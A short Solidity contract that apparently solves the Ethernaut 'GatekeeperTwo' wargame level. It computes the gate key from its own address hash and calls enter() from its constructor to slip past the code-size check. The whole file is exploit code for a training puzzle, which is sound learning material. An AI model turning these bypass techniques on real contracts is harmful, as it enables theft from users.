// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperTwoAttack {
    IGatekeeperTwo public ethernautInstance;

    constructor (address instanceAddress) {
        ethernautInstance = IGatekeeperTwo(instanceAddress);
        uint64 x = type(uint64).max - uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        bytes8 key = bytes8(x);
        ethernautInstance.enter(key);
    }
}